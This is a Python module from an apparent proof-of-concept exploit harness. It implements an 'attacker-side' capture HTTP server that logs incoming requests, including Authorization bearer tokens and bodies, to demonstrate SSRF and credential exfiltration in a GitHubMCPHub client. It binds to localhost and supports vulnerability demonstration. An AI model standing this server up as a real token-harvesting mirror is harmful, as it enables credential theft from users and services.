# -*- coding: utf-8 -*-
"""Attacker-side capture endpoint (logging mirror / probe).

Stdlib only. Records every inbound request — method, path+query, User-Agent,
Authorization header, body — so that the effects of the sink in
`GitHubMCPHub._request()` can be observed from the receiving side:

  * the destination host/port chosen by `base_url`  -> SSRF
  * the `Authorization: Bearer <token>` header      -> credential exfiltration
  * `params` / `path` supplied by the caller        -> parameter injection

This is the component that stands in for the "attacker-controlled registry
mirror" and the "intranet probe" in `exp_github_hub.py` / `exp_logic.py`.
Nothing leaves the machine it runs on.
"""
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer


class _Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _record(self, method):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        hit = {
            "ts": time.strftime("%H:%M:%S"),
            "method": method,
            "path": self.path,
            "ua": self.headers.get("User-Agent", ""),
            "auth": self.headers.get("Authorization", ""),
            "body": body,
        }
        self.server.hits.append(hit)
        line = "[%s] %s %s UA=%s AUTH=%s body=%r" % (
            hit["ts"], method, self.path, hit["ua"] or "-",
            hit["auth"] or "-", body[:120])
        print("    %s" % line, flush=True)
        # Answer with a body that is *not* a registry document on purpose:
        # the caller then raises HubError, while the request it sent is already
        # captured. A 500 from the service therefore still proves the SSRF.
        payload = b'{"objects": [], "incomplete": false}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self):
        self._record("GET")

    def do_POST(self):
        self._record("POST")

    def log_message(self, *args):  # silence default access log
        pass


class CaptureServer:
    """Threaded HTTP server with an append-only `hits` list."""

    def __init__(self, port, label="PROBE", host="127.0.0.1"):
        self.port, self.label, self.host = port, label, host
        self._srv = None
        self._th = None

    def start(self, host=None):
        if host:
            self.host = host
        self._srv = HTTPServer((self.host, self.port), _Handler)
        self._srv.hits = []
        self._th = threading.Thread(target=self._srv.serve_forever, daemon=True)
        self._th.start()
        return self

    def wait(self, n=1, timeout=20):
        end = time.time() + timeout
        while time.time() < end:
            if len(self._srv.hits) >= n:
                return True
            time.sleep(0.2)
        return False

    def dump(self, title=None):
        if title:
            print("== %s ==" % title)
        for h in self._srv.hits:
            print("[%s] %s %s UA=%s AUTH=%s body=%r"
                  % (h["ts"], h["method"], h["path"], h["ua"] or "-",
                     h["auth"] or "-", h["body"][:120]))

    def stop(self):
        if self._srv:
            self._srv.shutdown()
            self._srv.server_close()
            self._srv = None

    @property
    def hits(self):
        return list(self._srv.hits)


def free_port(preferred):
    """Return `preferred` if bindable, else an OS-assigned port."""
    with socket.socket() as s:
        try:
            s.bind(("127.0.0.1", preferred))
            return preferred
        except OSError:
            s.bind(("127.0.0.1", 0))
            return s.getsockname()[1]
